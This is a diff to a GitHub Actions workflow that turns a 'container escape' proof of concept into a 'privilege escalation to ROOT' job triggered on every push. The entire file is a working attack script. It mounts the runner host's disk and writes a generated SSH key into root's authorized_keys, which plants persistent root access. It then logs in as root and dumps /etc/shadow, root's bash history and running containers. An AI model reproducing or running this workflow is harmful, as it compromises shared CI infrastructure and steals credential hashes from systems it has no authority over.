@@ -1,38 +1,40 @@
-name: github-actions-container-escape
-run-name: Container Escape POC
+name: github-privesc-to-root
+run-name: Privilege Escalation to ROOT
 on: [push]
 jobs:
   exploit:
     runs-on: ubuntu-latest
     steps:
-      - name: Escape and compromise host
+      - name: Escalate to ROOT on host
         run: |
           # Mount host filesystem
-          whoami
-          id
           sudo mkdir -p /mnt/host
           sudo mount /dev/sda1 /mnt/host
           
           # Generate SSH key
-          ssh-keygen -t ed25519 -f /tmp/key -N ""
+          ssh-keygen -t ed25519 -f /tmp/root_key -N ""
           
-          # Inject SSH key into host
-          sudo mkdir -p /mnt/host/home/linuxbrew/.ssh
-          sudo cp /tmp/key.pub /mnt/host/home/linuxbrew/.ssh/authorized_keys
-          sudo chown -R 1001:1001 /mnt/host/home/linuxbrew/.ssh
-          sudo chmod 700 /mnt/host/home/linuxbrew/.ssh
-          sudo chmod 600 /mnt/host/home/linuxbrew/.ssh/authorized_keys
+          # Inject SSH key into ROOT user
+          sudo mkdir -p /mnt/host/root/.ssh
+          sudo cp /tmp/root_key.pub /mnt/host/root/.ssh/authorized_keys
+          sudo chown -R 0:0 /mnt/host/root/.ssh
+          sudo chmod 700 /mnt/host/root/.ssh
+          sudo chmod 600 /mnt/host/root/.ssh/authorized_keys
           
           # Get host IP
           HOST_IP=$(hostname -I | awk '{print $1}')
           
-          # SSH to host and run commands
-          ssh -i /tmp/key -o StrictHostKeyChecking=no linuxbrew@$HOST_IP << 'EOF'
-          echo "=== CONTAINER ESCAPED TO HOST ==="
+          # Check if root SSH is allowed
+          echo "=== Checking SSH config ==="
+          sudo cat /mnt/host/etc/ssh/sshd_config | grep PermitRootLogin
+          
+          # SSH as ROOT
+          ssh -i /tmp/root_key -o StrictHostKeyChecking=no -T root@$HOST_IP << 'EOF'
+          echo "=== ESCALATED TO ROOT ON HOST ==="
           whoami
+          id
           hostname
-          pwd
-          cd ../../../../.. && ls
-          cd ../../../../../../.. && cd home && ls
-          lsblk
+          cat /etc/shadow | head -3
+          docker ps
+          cat /root/.bash_history | head -20
           EOF
